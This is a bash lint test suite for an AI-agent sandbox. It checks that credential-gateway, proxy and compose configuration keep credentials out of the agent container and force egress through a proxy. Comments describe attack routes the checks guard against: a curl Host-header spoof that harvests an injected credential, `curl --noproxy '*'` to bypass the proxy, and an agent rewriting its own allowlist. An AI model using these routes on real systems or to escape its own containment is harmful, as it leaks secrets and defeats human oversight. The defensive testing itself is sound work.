#!/usr/bin/env bash
# Static checks on committed config. No docker, no network — runs in ~1s.
# These guard invariants documented in CLAUDE.md that are easy to break in a
# hurry and expensive to notice: a prefix-match location, a real credential
# pasted into a compose file, an addon widened to match github.com.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/../lib.sh"
cd "$REPO_ROOT"

SNIPPETS=(examples/claude-code/cred-gateway/*.conf examples/dev-container/.devcontainer/cred-gateway/*.conf)
COMPOSES=(stack/compose.yaml examples/claude-code/compose.yaml examples/dev-container/.devcontainer/compose.yaml)

BANK_SCHEMA="bank/schema/provider.schema.json"
require_jq   # manifests are JSON and are read, not pattern-matched

# The checks themselves live in scripts/lib/invariants.sh, shared with
# scripts/check-invariants.sh so a deployment can run the same ones against its
# own files (#26). This suite is the "is OUR code safe?" caller.
. "$REPO_ROOT/scripts/lib/invariants.sh"

suite "cred-gateway snippets use exact-match locations"
# A prefix match like `location /github/` exposes every broker route under it,
# including /github/token. tests/integration/10 proves that leak is real.
for f in "${SNIPPETS[@]}" bank/*/cred-gateway/*.conf; do
  [ -f "$f" ] || continue
  if bad=$(inv_location_prefix "$f"); then ok "$f — all locations exact-match"
  else ko "$f — non-exact location" "$bad"; fi
done

suite "snippets do not expose raw-credential endpoints"
# These hand the lab container a usable secret rather than spending it on
# lab's behalf. They belong in a proxy addon, never in the gateway.
for f in "${SNIPPETS[@]}" bank/*/cred-gateway/*.conf; do
  [ -f "$f" ] || continue
  if bad=$(inv_raw_cred_endpoint "$f"); then ok "$f — exposes no raw-credential route"
  else ko "$f — exposes a raw-credential route" "$bad"; fi
done

suite "the scanner's deny list covers every unexposed bank route"
# INV_DENY_PATHS is static because scripts/check-invariants.sh runs on a
# deployment with no checkout and cannot derive it from bank/*/provider.json.
# This is what stops it lagging: adding a provider whose unexposed route is
# missing from the library fails here rather than silently narrowing what a
# deployment gets checked for. Superset, not equality — retired routes stay in
# the list after no manifest mentions them, which is the point of keeping them.
for m in bank/*/provider.json; do
  [ -f "$m" ] || continue
  while IFS= read -r route; do
    [ -n "$route" ] || continue
    if printf '%s\n' $INV_DENY_PATHS | grep -qx "$route"; then
      ok "INV_DENY_PATHS covers $route"
    else
      ko "INV_DENY_PATHS is missing $route" \
         "declared \"exposed\": false in $m — add it to scripts/lib/invariants.sh"
    fi
  done < <(jq -r '.broker_routes[] | select(.exposed | not) | .path' "$m")
done

suite "snippets do not redeclare the rate-limit zone"
for f in "${SNIPPETS[@]}"; do
  if grep -q 'limit_req_zone' "$f"; then
    ko "$f — redeclares limit_req_zone" "declared at http level in stack/cred-gateway/nginx.conf"
  else
    ok "$f — references the shared creds zone only"
  fi
done

suite "cred-gateway base image ships no provider endpoints"
conf=stack/cred-gateway/nginx.conf
prov=$(grep -nE '^[[:space:]]*location[[:space:]]*=[[:space:]]*/(github|anthropic|cloudflare)' "$conf" || true)
if [ -z "$prov" ]; then ok "base nginx.conf has no provider locations"
else ko "base nginx.conf has provider locations" "$prov"; fi

check_contains "base nginx.conf includes gateway.d" "$(cat $conf)" 'include /etc/nginx/gateway.d/*.conf;'
if grep -qE '^[[:space:]]*location[[:space:]]*/[[:space:]]*\{' "$conf" && grep -q 'return 403' "$conf"; then
  ok "base nginx.conf keeps the default-deny location"
else
  ko "base nginx.conf default-deny missing" "location / { return 403; } is the backstop"
fi

suite "each example mounts its snippets read-only"
# Matches the container target and :ro, not the host directory name — the
# source path is the deployment's to choose, and pinning it here made this
# fail on a pure rename rather than on anything that weakened the boundary.
for c in examples/claude-code/compose.yaml examples/dev-container/.devcontainer/compose.yaml; do
  if grep -qE ':/etc/nginx/gateway\.d:ro( |$)' "$c"; then
    ok "$c — snippets mounted read-only at /etc/nginx/gateway.d"
  else
    ko "$c — snippet mount missing or writable" "snippets are the whitelist; lab must not be able to edit them"
  fi
done

suite "dev-container shadows .devcontainer as read-only"
# This example mounts ../ (the parent of .devcontainer) read-write at
# /workspace, so without the nested mount the agent can rewrite proxy/,
# broker/ and cred-gateway/ and wait for a restart. tests/integration/50 proves the
# shadow works at runtime.
c=examples/dev-container/.devcontainer/compose.yaml
if grep -q '\.\./\.devcontainer:/workspace/\.devcontainer:ro' "$c"; then
  ok "$c — nested read-only bind present"
else
  ko "$c — nested read-only bind missing" "agent could widen the proxy allowlist or gateway whitelist"
fi

suite "lab containers hold no real credentials"
# CLAUDE.md invariant: these are dummy values that satisfy client-side "am I
# authenticated?" checks. The proxy strips and replaces them at the wire level.
for c in "${COMPOSES[@]}"; do
  if bad=$(inv_real_credential "$c"); then ok "$c — placeholder vars are all inert"
  else ko "$c — a placeholder var holds something else" "$bad"; fi
done

suite "no credential material committed"
# Length-bounded so `.env.example` placeholders (sk-ant-..., ghp_xxx) do not
# trip the check while a real key still would.
# Patterns come from the library; the traversal does not. git grep covers the
# whole repo and respects .gitignore, which is the right sweep here and is not
# something a scanner pointed at one deployment directory can do.
while IFS= read -r pat; do
  hits=$(git grep -lE "$pat" -- . ':!tests/integration/00-config-lint.test.sh' ':!scripts/lib/invariants.sh' 2>/dev/null || true)
  if [ -z "$hits" ]; then ok "no match for /$pat/"
  else ko "credential-shaped string committed: /$pat/" "$hits"; fi
done <<EOF
$INV_CRED_PATTERNS
EOF

suite "audit events reference an exception only via .code or .name"
# Not the security control. The audit trail is written entirely by whatever
# provider and addon files a deployment mounts, and this suite cannot see
# those — PLAYBOOK.md's "What is safe to log" is what reaches them. What this
# guards is the files people copy: every generated stack starts by vendoring
# an example, so the anti-pattern must not ship in one.
#
# An exception message is free text from whoever raised it, and providers
# interpolate vendor responses into theirs (cloudflare.js: `Cloudflare API
# error: ${JSON.stringify(result.errors)}`). Detail belongs on stdout, which
# observer does not read.
#
# Allowlist, not blocklist. Enumerating the ways of writing "the error" loses
# to the next one invented — String(err), `${err}`, err.toString(), err.cause,
# str(exc), f"{e}" are all the same leak, and String(err) is what
# stack/broker/server.js itself used before this suite existed. So: inside a
# logEvent()/log_event() call, strip the field *names*, strip the two permitted
# references, and flag any mention of the exception variable that survives.
for f in stack/broker/*.js stack/proxy/*.py examples/*/broker/*.js \
         examples/*/.devcontainer/broker/*.js examples/*/proxy/*.py \
         examples/*/.devcontainer/proxy/*.py stack/proxy/addons/*.py \
         bank/*/broker/*.js bank/*/proxy/*.py; do
  [ -f "$f" ] || continue
  if bad=$(inv_exception_quoted "$f"); then ok "$(basename "$f") — exception referenced safely or not at all"
  else ko "$f — audit event quotes an exception" "$bad"; fi
done

suite "github addon does not match github.com"
# Documented invariant: git push/pull authenticates through the credential
# helper. Matching github.com here collides with git's Basic auth handshake
# inside the MITMed tunnel.
for f in examples/*/proxy/010_github.py examples/*/.devcontainer/proxy/010_github.py \
         bank/github/proxy/github.py; do
  [ -f "$f" ] || continue
  if bad=$(inv_github_com_matched "$f"); then ok "$f — matches api./uploads. hosts only"
  else ko "$f — matches github.com" "$bad"; fi
done

suite "only the policy addon references pretty_host in code"
# The first invariant in CLAUDE.md, and until now the only one with no static
# check: pretty_host prefers the client-supplied Host header, so matching on
# it let `curl -H 'Host: api.anthropic.com' http://my-server/` collect a real
# injected credential. tests/integration/20, 25 and 30 prove this at runtime,
# which is coverage a deployment cannot run against its own addons.
#
# 000_policy.py is exempt, and it is the only file that is. It reads
# `host in _INTERNAL_HOSTS or flow.request.pretty_host in _INTERNAL_HOSTS` —
# pretty_host OR'd with the real host, to *widen* a block. Trusting a claimed
# Host to deny more is safe; trusting it to permit or to route a credential is
# the bug. Distinguishing those two by grep is not worth attempting, so the
# rule is positional: that file is copied verbatim from stack/proxy/addons/
# and check-drift.sh already enforces that it still matches.
#
# Comments and docstrings are stripped first — every shipped addon explains
# this anti-pattern in its own prose, which is the point.
for f in examples/*/proxy/*.py examples/*/.devcontainer/proxy/*.py stack/proxy/addons/*.py \
         bank/*/proxy/*.py; do
  [ -f "$f" ] || continue
  [ "$(basename "$f")" = "000_policy.py" ] && continue
  if bad=$(inv_pretty_host "$f"); then ok "$(basename "$f") — decides on flow.request.host"
  else ko "$f — references pretty_host outside a comment" "$bad"; fi
done

suite "addons take no direction from a client-supplied request header"
# The lab container writes these headers. An addon that binds one to a name is
# letting the untrusted side steer what the addon does next — and for a
# credential-injecting addon that means which credential gets attached.
# 030_cloudflare.py shipped this until 1.6.0: X-Cf-Profile chose the profile, so
# a dev/qa/prod ladder was decorative and the audit line recorded the escalated
# profile as though it had been authorised.
#
# Stripping is not reading: a bare pop() or del is how a client header is
# correctly dropped, and does not trip this.
for f in examples/*/proxy/*.py examples/*/.devcontainer/proxy/*.py stack/proxy/addons/*.py \
         bank/*/proxy/*.py; do
  [ -f "$f" ] || continue
  if bad=$(inv_header_selector "$f"); then ok "$(basename "$f") — reads no client header into a variable"
  else ko "$f — binds a client-supplied header to a name it acts on" "$bad"; fi
done

suite "addons log a parsed endpoint, never a raw request path"
# The trail is a plaintext file that observer serves over HTTP, and
# mitmproxy's flow.request.path includes the query string. For a provider
# that carries its credential in the URL — Telegram's /bot<TOKEN>/<method>,
# an ?access_token= elsewhere — `path=flow.request.path` writes a live
# credential into it. These addons are also what gets copied when someone
# adds a provider, so the shipped pattern has to be the safe one.
# Backticked mentions are prose (the addons explain the anti-pattern in their
# own docstrings), so only real keyword arguments count.
for f in examples/*/proxy/*.py examples/*/.devcontainer/proxy/*.py stack/proxy/addons/*.py \
         bank/*/proxy/*.py; do
  [ -f "$f" ] || continue
  if bad=$(inv_raw_path_logged "$f"); then ok "$(basename "$f") — no raw path in an audit event"
  else ko "$f — logs a raw request path" "$bad"; fi
done

# Splitting the raw path on "/" is the same bug wearing a parse. Because
# flow.request.path carries the query string, the last segment absorbs it:
# on /bot<TOKEN>/sendMessage?chat_id=…&text=…, split("/")[2] is the message
# body, not the method. The token sits in segment 1 and stays out, which is
# what lets the mistake read as safe. The fix is ordering — split("?", 1)[0]
# first — so the check is for a "/" split taken directly off the raw path.
#
# PLAYBOOK.md is in scope, and is why this exists: it shipped that exact
# snippet as the *recommended* Telegram pattern from 1.2.0 to 1.4.1, in the
# paragraph warning that the path includes the query string. A deployment
# following it built the leak the release was written to prevent. Prose
# mentions are backticked; code blocks are not.
for f in PLAYBOOK.md examples/*/proxy/*.py examples/*/.devcontainer/proxy/*.py \
         stack/proxy/addons/*.py; do
  [ -f "$f" ] || continue
  if bad=$(inv_raw_path_split "$f"); then ok "$(basename "$f") — no \"/\" split off a raw path"
  else ko "$f — splits a raw path on \"/\", so the last segment holds the query string" "$bad"; fi
done

suite "policy addon loads before provider addons"
# 000_policy.py must run first; entrypoint.sh globs alphabetically.
for d in examples/*/proxy examples/*/.devcontainer/proxy stack/proxy/addons; do
  [ -d "$d" ] || continue
  if bad=$(inv_policy_addon_first "$d"); then ok "$d — first addon is 000_policy.py"
  else ko "$d — policy addon does not load first" "$bad"; fi
done

suite "examples build from a release tag, not a branch"
# Tracking #main means a rebuild silently picks up whatever landed on main
# since, while the bind-mounted addons stay frozen at whatever was copied —
# the image moves and the security-relevant files do not. That split is
# exactly what the 0.1.0 upgrade notes warn about, so the examples must not
# reproduce it. Bump these when cutting a release.
for c in examples/claude-code/compose.yaml examples/dev-container/.devcontainer/compose.yaml; do
  refs=$(grep -oE 'secure-agent-lab\.git#[^:]+' "$c" | cut -d'#' -f2 | sort -u)
  if [ -z "$refs" ]; then
    skip "$c — no git-URL builds" ""
  else
    bad=$(printf '%s\n' "$refs" | grep -vE '^v[0-9]+\.[0-9]+\.[0-9]+$' || true)
    if [ -z "$bad" ]; then
      ok "$c — builds pinned to $(printf '%s' "$refs" | tr '\n' ' ')"
    else
      ko "$c — build ref is not a release tag" "found: $(printf '%s' "$bad" | tr '\n' ' ')"
    fi
  fi
done

suite "lab mounts land in the container's HOME"
# When examples/claude-code stopped running as root, HOME moved to /home/agent
# but the compose mounts stayed at /root/. Nothing failed loudly: Claude Code
# read $HOME, found an empty directory, and quietly lost its settings and auth
# on every recreate. Derive HOME from the Dockerfile rather than hardcoding it,
# so this keeps working if the user is renamed again.
CC_DOCKERFILE=examples/claude-code/lab/Dockerfile
CC_COMPOSE=examples/claude-code/compose.yaml
if [ -f "$CC_DOCKERFILE" ] && [ -f "$CC_COMPOSE" ]; then
  home=$(grep -oP '^ENV HOME=\K\S+' "$CC_DOCKERFILE" | tail -1)
  if [ -z "$home" ]; then
    skip "claude-code lab HOME" "no ENV HOME in $CC_DOCKERFILE — image uses the base default"
  else
    ok "claude-code lab HOME is $home"
    # Every state mount the agent needs to write must sit under it.
    for m in .claude .claude.json .config; do
      target=$(grep -oE "\./workspace/${m//./\\.}:[^:[:space:]]+" "$CC_COMPOSE" | head -1 | cut -d: -f2)
      if [ -z "$target" ]; then
        skip "workspace/$m is not mounted" ""
      else
        check "workspace/$m mounts under $home" "$home/$m" "$target"
      fi
    done
    check_not_contains "no lab mount targets /root" "$(grep -A20 '^  lab:' "$CC_COMPOSE")" ":/root/"
  fi
fi

suite "audit-logs volume is wired wherever observer/log-rotator are present"
# stack/compose.yaml always has this wiring; examples pick it up one at a
# time as they're repinned (see the audit-helper suite below) — check
# whichever composes actually declare an observer service, rather than a
# fixed list that goes stale as more examples upgrade.
AUDIT_COMPOSES=()
for c in stack/compose.yaml examples/claude-code/compose.yaml examples/dev-container/.devcontainer/compose.yaml; do
  grep -q '^  observer:' "$c" && AUDIT_COMPOSES+=("$c")
done
for conf in "${AUDIT_COMPOSES[@]}"; do
  check_contains "$conf — audit-logs volume declared" "$(cat "$conf")" $'  audit-logs:'
  for svc in broker proxy cred-gateway; do
    block=$(awk -v s="  $svc:" 'index($0,s)==1{f=1;next} f&&/^  [a-zA-Z-]+:/{exit} f' "$conf")
    check_contains "$conf — $svc mounts audit-logs at /var/log/audit" "$block" "audit-logs:/var/log/audit"
  done
  for svc in broker proxy; do
    block=$(awk -v s="  $svc:" 'index($0,s)==1{f=1;next} f&&/^  [a-zA-Z-]+:/{exit} f' "$conf")
    check_contains "$conf — $svc sets AUDIT_LOG" "$block" "AUDIT_LOG:"
  done
done

suite "the lab network is internal, so the proxy cannot be bypassed"
# Without this, HTTP_PROXY is a request the agent can decline: `curl --noproxy
# '*'` leaves the container without touching the proxy, which makes
# 001_allowlist.py advisory rather than enforcing. secure is deliberately NOT
# internal — broker calls provider APIs directly through it.
for c in "${COMPOSES[@]}" tests/e2e/compose.yaml; do
  [ -f "$c" ] || continue
  if bad=$(inv_egress_unmediated "$c"); then ok "$c — lab network is internal"
  else ko "$c — lab network permits unmediated egress" "$bad"; fi
done

suite "observer and log-rotator stay off secure/lab"
# Deliberately no `networks:` key for either — see CLAUDE.md. They still land
# on Compose's implicit `default` network, but every other service declares
# an explicit `networks:` list and never joins `default`, so that network
# ends up containing only these two with no route to anything else.
for conf in "${AUDIT_COMPOSES[@]}"; do
  for svc in observer log-rotator; do
    block=$(awk -v s="  $svc:" 'index($0,s)==1{f=1;next} f&&/^  [a-zA-Z-]+:/{exit} f' "$conf")
    check_not_contains "$conf — $svc has no explicit networks: key" "$block" "networks:"
  done
done

suite "observer's dashboard port is loopback-only"
for conf in "${AUDIT_COMPOSES[@]}"; do
  obs_block=$(awk '/^  observer:/{f=1;next} f&&/^  [a-zA-Z-]+:/{exit} f' "$conf")
  check_contains "$conf — observer port bound to 127.0.0.1" "$obs_block" '"127.0.0.1:9000:9000"'
done

suite "cred-gateway bakes an empty /var/log/audit"
# Unlike AUDIT_LOG (opt-in, no-op if unset), nginx fails to start if a
# configured access_log's directory is missing — this must exist unmounted.
check_contains "cred-gateway Dockerfile creates /var/log/audit" \
  "$(cat stack/cred-gateway/Dockerfile)" "mkdir -p /var/log/audit"

suite "examples only depend on the stack audit helpers when their pin can back it"
# examples/*/broker and examples/*/proxy are bind-mounted into an image built
# from a pinned release tag (see "examples build from a release tag" above).
# audit.js/audit.py were introduced in the stack image at 1.1.0 — an example
# pinned below that would MODULE_NOT_FOUND on require("../audit")/import audit,
# and one pinned at or above it should actually be using the helper, not
# silently missing the audit trail. Derived from each example's own pin
# rather than hardcoded per example, so this keeps working unattended as
# examples upgrade one at a time instead of needing a manual edit here.
# The floor: the stack release that introduced audit.js/audit.py. Used when jq
# is unavailable, and as the starting point each example's requirement is
# raised from.
AUDIT_MIN="1.1.0"
EXAMPLE_COMPOSES=(examples/claude-code/compose.yaml examples/dev-container/.devcontainer/compose.yaml)
EXAMPLE_DIRS=(examples/claude-code examples/dev-container/.devcontainer)
for i in "${!EXAMPLE_COMPOSES[@]}"; do
  c="${EXAMPLE_COMPOSES[$i]}"
  dir="${EXAMPLE_DIRS[$i]}"
  tag=$(grep -oE 'secure-agent-lab\.git#v[0-9]+\.[0-9]+\.[0-9]+' "$c" | head -1 | sed 's/.*#v//')
  if [ -z "$tag" ]; then skip "$dir — no pinned tag found" ""; continue; fi

  # Suite E: the requirement is the highest min_stack among the bank entries
  # this example actually vendors, not one constant for every example. An entry
  # that needs 1.5.0 raises the bar for the examples carrying it and for nobody
  # else — which is the whole reason min_stack is a manifest field rather than
  # a note in the changelog.
  required="$AUDIT_MIN"
  for bf in "$dir"/broker/*.js "$dir"/proxy/*.py; do
    [ -f "$bf" ] || continue
    bb=$(basename "$bf"); bs=${bb#[0-9][0-9][0-9]_}; bn=${bs%.*}
    bm="bank/$bn/provider.json"
    [ -f "$bm" ] || continue
    required=$(printf '%s\n%s\n' "$required" "$(jq -r .min_stack "$bm")" | sort -V | tail -1)
  done

  higher=$(printf '%s\n%s\n' "$required" "$tag" | sort -V | tail -1)
  if [ "$higher" = "$tag" ]; then
    for f in "$dir"/broker/*.js; do
      [ -f "$f" ] || continue
      check_contains "$f (pinned v$tag, needs v$required) uses the audit helper" "$(cat "$f")" 'require("../audit")'
    done
    for f in "$dir"/proxy/*.py; do
      [ -f "$f" ] || continue
      check_contains "$f (pinned v$tag, needs v$required) uses the audit helper" "$(cat "$f")" "import audit"
    done
  else
    for f in "$dir"/broker/*.js; do
      [ -f "$f" ] || continue
      check_not_contains "$f (pinned v$tag, below the v$required its entries need) does not require audit.js" "$(cat "$f")" 'require("../audit")'
    done
    for f in "$dir"/proxy/*.py; do
      [ -f "$f" ] || continue
      check_not_contains "$f (pinned v$tag, below the v$required its entries need) does not import audit.py" "$(cat "$f")" "import audit"
    done
  fi
done

# ---------------------------------------------------------------------------
# Suite A — bank manifests are well-formed.
#
# The constraints are read OUT OF the schema (required[], the load_band enum,
# the name pattern) rather than restated here. Tightening the schema tightens
# this suite in the same commit; restating them would let the two drift, which
# is the same failure mode as the hardcoded route list this bank exists to
# retire.
#
# This is not full JSON Schema validation — that would put a validator on the
# host for the one suite that otherwise needs nothing but bash. jq is a soft
# dependency: without it these checks skip and the rest of the lint still runs.
# ---------------------------------------------------------------------------
suite "bank manifests are well-formed"
BANK_SCHEMA="bank/schema/provider.schema.json"
bank_entries=(bank/*/)
if [ ! -f "$BANK_SCHEMA" ]; then
  ko "bank schema present" "$BANK_SCHEMA missing"
elif ! jq -e . "$BANK_SCHEMA" >/dev/null 2>&1; then
  ko "bank schema is valid JSON" "$BANK_SCHEMA does not parse"
else
  ok "$BANK_SCHEMA parses"
  req_fields=$(jq -r '.required[]' "$BANK_SCHEMA")
  name_pat=$(jq -r '.properties.name.pattern' "$BANK_SCHEMA")
  bands=$(jq -r '.properties.load_band.enum[]' "$BANK_SCHEMA")
  # Every top-level property the schema knows about, so a stray key is caught
  # even though we are not running a real validator.
  known=$(jq -r '.properties | keys[]' "$BANK_SCHEMA")

  found_entry=0
  for d in "${bank_entries[@]}"; do
    [ -d "$d" ] || continue
    case "$d" in bank/schema/) continue ;; esac
    found_entry=1
    entry="${d%/}"; base="$(basename "$entry")"; man="$entry/provider.json"

    if [ ! -f "$man" ]; then ko "$entry — has provider.json" "missing"; continue; fi
    if ! jq -e . "$man" >/dev/null 2>&1; then ko "$man — valid JSON" "does not parse"; continue; fi

    for f in $req_fields; do
      if jq -e --arg k "$f" 'has($k)' "$man" >/dev/null; then ok "$man — has required .$f"
      else ko "$man — missing required .$f" "schema requires it"; fi
    done

    mname=$(jq -r '.name // ""' "$man")
    check "$man — .name matches directory name" "$mname" "$base"
    if printf '%s' "$mname" | grep -qE "$name_pat"; then ok "$man — .name matches schema pattern"
    else ko "$man — .name violates schema pattern" "$mname !~ $name_pat"; fi

    ms=$(jq -r '.min_stack // ""' "$man")
    if printf '%s' "$ms" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+$'; then ok "$man — .min_stack is semver ($ms)"
    else ko "$man — .min_stack is not semver" "got '$ms'"; fi

    lb=$(jq -r '.load_band // ""' "$man")
    if printf '%s\n' $bands | grep -qx "$lb"; then ok "$man — .load_band in schema enum ($lb)"
    else ko "$man — .load_band not in schema enum" "got '$lb', want one of: $(echo $bands)"; fi

    for k in $(jq -r 'keys[]' "$man"); do
      if printf '%s\n' $known | grep -qx "$k"; then ok "$man — .$k is a known field"
      else ko "$man — unknown field .$k" "not in schema properties"; fi
    done

    # Files the manifest implies must exist, and no file may ride along that
    # the manifest never mentions. Both directions: a missing addon breaks the
    # install, a stray file is something nobody reviewed.
    implied="provider.json broker/$base.js proxy/$base.py"
    jq -e '.broker_routes[] | select(.exposed)' "$man" >/dev/null 2>&1 \
      && implied="$implied cred-gateway/$base.conf"
    ls=$(jq -r '.lab_setup // ""' "$man"); [ -n "$ls" ] && implied="$implied $ls"

    for rel in $implied; do
      if [ -f "$entry/$rel" ]; then ok "$entry/$rel exists"
      else ko "$entry/$rel missing" "implied by the manifest"; fi
    done
    while IFS= read -r actual; do
      rel="${actual#$entry/}"
      if printf '%s\n' $implied | grep -qx "$rel"; then ok "$entry/$rel is implied by the manifest"
      else ko "$entry/$rel is not implied by the manifest" "stray file in a bank entry"; fi
    done < <(find "$entry" -type f | sort)
  done
  [ "$found_entry" = 0 ] && skip "bank entries" "none present"
fi

# ---------------------------------------------------------------------------
# Suite B — addons match their declared hosts, in both directions.
#
# Generalizes "github addon does not match github.com" to every provider. That
# suite is kept rather than deleted, now as defence in depth rather than as a
# fallback: it asserts the invariant directly against the file, where this one
# reaches the examples only transitively (bank is clean AND suite D says the
# examples match it). One grep is cheap insurance on the one invariant this
# project has actually shipped a violation of.
#
# Both directions matter. An addon matching a host the manifest omits is an
# addon injecting somewhere the allowlist seed never authorized; a manifest
# listing a host the addon ignores seeds egress for a destination nothing
# validates. Comments and docstrings are stripped with the same awk as the
# pretty_host suite — every addon names hostnames in its own prose.
# ---------------------------------------------------------------------------
suite "bank addons match their declared hosts"
for m in bank/*/provider.json; do
  [ -f "$m" ] || continue
  nm=$(jq -r .name "$m"); addon="bank/$nm/proxy/$nm.py"
  [ -f "$addon" ] || continue
  declared=$(jq -r '.hosts[]' "$m" | sort -u)
  actual=$(awk '
    { line = $0; sub(/#.*$/, "", line) }
    { gsub(/"""[^"]*"""/, "", line); gsub(/\x27\x27\x27[^\x27]*\x27\x27\x27/, "", line) }
    { q = gsub(/"""/, "&", line) + gsub(/\x27\x27\x27/, "&", line) }
    ds  { if (q % 2 == 1) ds = 0; next }
    q % 2 == 1 { ds = 1; next }
    { print line }
  ' "$addon" \
    | grep -oE '"[a-z0-9][a-z0-9.-]*\.[a-z]{2,}"|'\''[a-z0-9][a-z0-9.-]*\.[a-z]{2,}'\''' \
    | tr -d '"'\''' | sort -u)
  missing=$(comm -23 <(printf '%s\n' "$declared") <(printf '%s\n' "$actual"))
  extra=$(comm -13 <(printf '%s\n' "$declared") <(printf '%s\n' "$actual"))
  if [ -z "$missing" ] && [ -z "$extra" ]; then
    ok "$addon — hosts agree with $m ($(echo $declared))"
  else
    ko "$addon — hosts disagree with $m" \
     "declared but not matched: ${missing:-none} | matched but not declared: ${extra:-none}"
  fi
done

# ---------------------------------------------------------------------------
# Suite C — gateway snippets expose only declared-exposed routes.
#
# Clause 2 of #32 §3 ("unexposed routes appear in no .conf, in any entry") is
# enforced by the deny-paths suite at the top, which now derives its list from
# these manifests and globs bank/*/cred-gateway too. This covers the other two:
# every exposed route is actually exposed, and every exposed location is a
# route the manifest declared.
# ---------------------------------------------------------------------------
suite "bank gateway snippets expose exactly their declared-exposed routes"
for m in bank/*/provider.json; do
  [ -f "$m" ] || continue
  nm=$(jq -r .name "$m"); conf="bank/$nm/cred-gateway/$nm.conf"
  exposed=$(jq -r '.broker_routes[] | select(.exposed) | .path' "$m" | sort -u)
  if [ -z "$exposed" ]; then
    if [ -f "$conf" ]; then
      ko "$nm — has a .conf but declares no exposed route" "$conf should not exist"
    else
      ok "$nm — declares no exposed route and ships no .conf"
    fi
    continue
  fi
  if [ ! -f "$conf" ]; then
    ko "$nm — declares exposed routes but ships no .conf" "expected $conf"
    continue
  fi
  present=$(grep -oE '^[[:space:]]*location[[:space:]]*=[[:space:]]*[^ {]+' "$conf" \
            | sed -E 's/.*=[[:space:]]*//' | sort -u)
  missing=$(comm -23 <(printf '%s\n' "$exposed") <(printf '%s\n' "$present"))
  extra=$(comm -13 <(printf '%s\n' "$exposed") <(printf '%s\n' "$present"))
  [ -z "$missing" ] && ok "$conf — every declared-exposed route has a location" \
                    || ko "$conf — declared exposed but absent" "$missing"
  [ -z "$extra" ]   && ok "$conf — every location is a declared route" \
                  || ko "$conf — exposes an undeclared route" "$extra"
done

# ---------------------------------------------------------------------------
# Suite D — examples match the bank byte for byte.
#
# The examples are what people copy. Once an entry exists, the example's copy
# is either identical to it or it is an unreviewed fork wearing a vetted name.
# Only one documented normalization: the NNN_ prefix, which is deployment state
# by design (see #32 §4), so it cannot be in the bank.
# ---------------------------------------------------------------------------
suite "examples match the bank byte for byte"
# These come from stack/proxy/addons/ rather than from a provider bank entry,
# and check-drift.sh already compares them against it.
BANK_EXEMPT="000_policy.py 001_allowlist.py"
for dir in examples/claude-code examples/dev-container/.devcontainer; do
  for svc in proxy broker cred-gateway; do
    for f in "$dir/$svc"/*; do
      [ -f "$f" ] || continue
      b=$(basename "$f")
      if printf '%s\n' $BANK_EXEMPT | grep -qx "$b"; then
        ok "$f — exempt, comes from stack/proxy/addons"
        continue
      fi
      stripped=${b#[0-9][0-9][0-9]_}
      nm=${stripped%.*}; ext=${stripped##*.}
      cand="bank/$nm/$svc/$nm.$ext"
      if [ ! -f "$cand" ]; then
        ko "$f — no bank counterpart" "expected $cand; add an entry or add $b to BANK_EXEMPT"
      elif cmp -s "$f" "$cand"; then
        ok "$f — identical to $cand"
      else
        ko "$f — has drifted from $cand" "$(diff "$cand" "$f" | head -6)"
      fi
    done
  done
done

finish
